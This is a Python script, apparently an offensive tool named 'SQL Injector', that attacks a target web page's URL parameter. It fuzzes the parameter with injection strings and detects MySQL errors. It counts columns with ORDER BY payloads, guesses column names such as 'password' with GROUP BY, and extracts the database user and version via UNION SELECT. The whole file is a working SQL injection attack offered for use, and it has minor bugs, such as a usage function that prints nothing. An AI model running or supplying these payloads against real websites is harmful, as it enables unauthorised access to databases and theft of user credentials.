import requests
from threading import Thread
import sys
from termcolor import colored
import getopt
from pyparsing import Word, Combine, alphas
import re

def banner():
    print("\n********************")
    print('*  SQL Injector  *')
    print("********************")

def usage():
    def usage():
        print("Usage:")
        print("         -w: url (http://somesite.com/news.php?id=FUZZ")
        print("         -i: injection strings file")
        #print("         -u: username")
        #print("         -f: dictionary file \n")
        print("example: SQL_Injector.py -w http://targetsite.com/news.php?id=FUZZ  -i common.txt\n")

def start(argv):
    banner()
    if len(sys.argv) < 2:
        usage()
        sys.exit()

    try:
        opts, args = getopt.getopt(argv, "w:i:")
    except getopt.GetoptError:
        print("Error en arguments")
        sys.exit()

    for opt, arg in opts:
        if opt == '-w':
            url = arg
        elif opt == '-i':
            dictio = arg

    try:
       f = open(dictio, "r")
       injects = f.read().splitlines()
    except:
        print("Failed opening file: " + dictio)
        sys.exit()

    launcher(url, injects)

def launcher(url, diction):
    injected = []
    for sql_inject in diction:
        injected.append(url.replace('FUZZ', sql_inject))

    res = injector(injected)
    print("Detection results:")
    print("-------------------")

    for x in res:
        print(x.split(';')[0])

    nums_of_col = detect_columns(url)
    print('\nNumber of columns:' + nums_of_col + '\n')
    print('---------------------------------')
    print('Column names')
    print('---------------------------------')
    [print(name) for name in detect_columns_names(url)]

    username = detect_user(url)
    print(username)
    print(detect_version(url))

def detect_columns(url):
    new_url = url.replace('FUZZ', "' order by X-- -")
    x = 1
    for i in range(1,50):
        req = requests.get(new_url.replace('X', str(i)))
        if req.text.find("Unknown") != -1:
            x = i
            break
    return str(x-1)

def detect_columns_names(url):
    column_names = ['username', 'name', 'pass', 'passwd', 'password', 'id', 'role', 'surname', 'address']
    new_url = url.replace("FUZZ", "' group by X-- -")

    valid_cols = []
    for name in column_names:
        req = requests.get(new_url.replace('X', name))
        if req.text.find('Unknown') == -1:
            valid_cols.append(name)
        else:
            pass

    return valid_cols

def injector(injected):
    errors = ['Mysql', 'error in your SQL']
    results = []

    for y in injected:
        print("[-] Testing errors: " + y)
        req = requests.get(y)

        for x in errors:
            if req.text.find(x) != -1:
                res = y + ';' + x
                results.append(res)
    return results

def detect_user(url):
    new_url = url.replace("FUZZ","-1'union select 1,user()-- -")
    req = requests.get(new_url)
    name = Combine(Word(alphas) +"@" + Word(alphas))
    pars_result = name('username').parseString(req.text)
    return pars_result.username

def detect_version(url):
    new_url=url.replace("FUZZ", "-1'union select test,concat('TOK',@@version,'TOK')")
    search_pattern = "TOK([a-zA-Z0-9].+?)TOK"
    req = requests.get(new_url)
    version = re.search(search_pattern,req.text)
    return version

if __name__ == "__main__":
    try:
        start(sys.argv[1:])

    except KeyboardInterrupt:
        print("Back interrupted by user, killing all threads..!!")

